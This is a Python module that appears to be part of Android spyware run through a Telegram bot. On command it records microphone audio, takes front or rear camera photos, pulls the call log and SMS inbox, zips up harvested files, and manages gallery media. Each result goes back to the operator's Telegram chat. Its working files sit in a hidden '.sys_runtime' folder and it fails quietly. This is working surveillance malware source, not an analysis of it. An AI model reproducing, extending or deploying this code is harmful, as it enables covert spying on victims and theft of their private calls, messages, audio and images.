# -*- coding: utf-8 -*-
import os, time, json, threading, logging, hashlib, secrets, sys

P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P): os.makedirs(P)
logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

class C:
    def __init__(self):
        self.t = os.path.join(P, "ctmp")
        if not os.path.exists(self.t): os.makedirs(self.t)
        self.lm = 0
        self.mic_busy = False
        self._cl()

    def _cl(self):
        try:
            n = time.time()
            for f in os.listdir(self.t):
                p = os.path.join(self.t, f)
                if os.path.getmtime(p) < n - 3600: os.remove(p)
        except: pass

    def _sf(self, tg, cid, ct, fn):
        p = os.path.join(self.t, fn)
        try:
            with open(p, 'w', encoding='utf-8', errors='ignore') as f: f.write(ct)
            with open(p, 'rb') as f:
                tg._ap("sendDocument", {"chat_id": cid, "caption": f"✅ {fn}"}, {"document": f})
        except Exception as e: logging.error(str(e))
        finally:
            if os.path.exists(p): os.remove(p)

    def _ra(self, d=10):
        if not JNI or self.mic_busy: return None
        self.mic_busy = True
        mr = None
        o = os.path.join(self.t, f"a_{int(time.time())}.aac")
        try:
            MR = autoclass('android.media.MediaRecorder')
            AS = autoclass('android.media.MediaRecorder$AudioSource')
            OF = autoclass('android.media.MediaRecorder$OutputFormat')
            AE = autoclass('android.media.MediaRecorder$AudioEncoder')
            mr = MR()
            mr.setAudioSource(AS.MIC)
            mr.setOutputFormat(OF.MPEG_4)
            mr.setAudioEncoder(AE.AAC)
            mr.setAudioEncodingBitRate(64000)
            mr.setAudioSamplingRate(44100)
            mr.setOutputFile(o)
            mr.prepare()
            mr.start()
            time.sleep(d)
            mr.stop()
            mr.reset()
            return o
        except Exception as e:
            logging.error(str(e))
            return None
        finally:
            self.mic_busy = False
            if mr:
                try: mr.release()
                except: pass

    def _cll(self, l=100):
        if not JNI: return "No JNI"
        try:
            r = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            U = autoclass('android.net.Uri')
            c = r.query(U.parse("content://call_log/calls"), None, None, None, "date DESC")
            if not c: return "Permission Denied or No Logs"
            lines = []
            idx_n = c.getColumnIndex("name")
            idx_nu = c.getColumnIndex("number")
            while c.moveToNext() and len(lines) < l:
                name = c.getString(idx_n) or "Unknown"
                num = c.getString(idx_nu) or "?"
                lines.append(f"👤 {name} ({num})")
            c.close()
            return "\n".join(lines) if lines else "Call log is empty"
        except: return "Error reading calls"

    def _sl(self, l=100):
        if not JNI: return "No JNI"
        try:
            r = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            U = autoclass('android.net.Uri')
            c = r.query(U.parse("content://sms/inbox"), None, None, None, "date DESC")
            if not c: return "Permission Denied or No SMS"
            lines = []
            idx_a = c.getColumnIndex("address")
            idx_b = c.getColumnIndex("body")
            while c.moveToNext() and len(lines) < l:
                addr = c.getString(idx_a) or "?"
                body = c.getString(idx_b) or ""
                lines.append(f"📩 From: {addr}\n💬 {body}\n---")
            c.close()
            return "\n".join(lines) if lines else "Inbox is empty"
        except: return "Error reading SMS"

    def _bo(self, m):
        try:
            b, ch = m._bat() if hasattr(m, '_bat') else (100, False)
            return b >= 15 or ch
        except: return True

    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._r, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    def _r(self, cmd, tg, m, cid, cbq):
        try:
            if not getattr(m, 'auth_active', False):
                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 /login"})
                return

            # أوامر المعرض (بدون تأخير)
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                if hasattr(m, 'gallery_browser'):
                    parts = cmd.split("|")
                    if parts[0] == "g_nav":
                        cat, page = parts[1], int(parts[2])
                        nk = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                        mid = getattr(m, 'last_mid', None)
                        if mid: tg._ap("editMessageReplyMarkup", {"chat_id": cid, "message_id": mid, "reply_markup": json.dumps(nk)})
                    elif parts[0] == "g_opt":
                        m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
                    elif parts[0] == "g_act":
                        m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
                    elif parts[0] == "g_conf":
                        act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                        ck = [[{"text": "🗑", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"}, {"text": "🔙", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                        tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️", "reply_markup": json.dumps({"inline_keyboard": ck})})
                return

            # الكاميرا
            if cmd.startswith(("cam_", "camf_")):
                is_front = 1 if "camf_" in cmd else 0
                if not self._bo(m):
                    tg._ap("sendMessage", {"chat_id": cid, "text": "🔋"})
                    return
                if not hasattr(m, 'camera_analyzer'):
                    try:
                        import camera_analyzer
                        m.camera_analyzer = camera_analyzer.CameraAnalyzer(m)
                    except:
                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌"})
                        return
                p = m.camera_analyzer.capture(cam_id=is_front)
                if p and os.path.exists(p):
                    with open(p, 'rb') as f:
                        tg._ap("sendPhoto", {"chat_id": cid, "caption": "📸"}, {"photo": f})
                    os.remove(p)
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌"})
                return

            # الميكروفون
            if cmd.startswith("mic_"):
                if self.mic_busy:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "⏳"})
                    return
                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤"})
                p = self._ra(10)
                if p:
                    with open(p, 'rb') as f:
                        r = tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})
                    if r and r.get('ok'): os.remove(p)
                    else:
                        pe = os.path.join(P, "pending")
                        if not os.path.exists(pe): os.makedirs(pe)
                        os.rename(p, os.path.join(pe, os.path.basename(p)))
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌"})
                return

            # سجل المكالمات والرسائل
            if cmd.startswith("callog_"):
                tg._ap("sendMessage", {"chat_id": cid, "text": "📞"})
                self._sf(tg, cid, self._cll(), "calls.txt")
                return
            if cmd.startswith("sms_"):
                tg._ap("sendMessage", {"chat_id": cid, "text": "📩"})
                self._sf(tg, cid, self._sl(), "sms.txt")
                return

            # الحصاد
            if cmd.startswith("hrv_"):
                if hasattr(m, 'daily_zipper'):
                    m.daily_zipper.run()
                    tg._ap("sendMessage", {"chat_id": cid, "text": "📦"})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌"})
                return

            # معرض الوسائط
            if cmd.startswith("media_"):
                if hasattr(m, 'gallery_browser'):
                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                    r = tg._ap("sendMessage", {"chat_id": cid, "text": "🖼", "reply_markup": json.dumps(kb)})
                    if r and r.get('ok'): m.last_mid = r['result']['message_id']
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌"})
                return

            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️"})

        except Exception as e:
            logging.error(str(e))
            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️"})

_h = None
def ex(d, tg, m, cid, cbq=None):
    global _h
    if _h is None: _h = C()
    _h.ex(d, tg, m, cid, cbq)
